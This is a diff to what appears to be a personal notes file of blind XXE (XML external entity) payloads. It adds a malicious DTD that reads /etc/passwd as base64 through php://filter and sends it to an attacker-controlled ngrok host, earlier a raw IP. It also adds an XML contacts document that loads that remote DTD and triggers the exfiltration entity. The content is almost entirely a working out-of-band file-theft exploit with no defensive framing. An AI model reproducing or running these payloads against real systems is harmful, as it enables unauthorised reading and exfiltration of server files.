@@ -67,8 +67,25 @@ evil.dtd
 # Blind
 
 ```dtd
-<!ENTITY data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> 
-<!ENTITY paran1 <!ENTITY exfil SYSTEM "http://206.189.166.24/?x=data; ">">
+<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> 
+<!ENTITY % paran1 "<!ENTITY exfil SYSTEM 'https://b99e-83-213-97-233.ngrok-free.app/?x=data;'>">
 ```
 
-
+```xml
+<?xml version="1.0" encoding="UTF-8"?>  
+<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "https://b99e-83-213-97-233.ngrok-free.app/evil.dtd">%remote;%paran1;]> 
+<contacts>  
+   <contact>  
+       <name>&exfil;</name>  
+       <email>ben@test.com</email>  
+   </contact>  
+   <contact>  
+       <name>adam</name>  
+       <email>adam@test.com</email>  
+   </contact>  
+   <contact>  
+       <name>test</name>  
+       <email>test@test.com</email>  
+   </contact>  
+</contacts>
+```
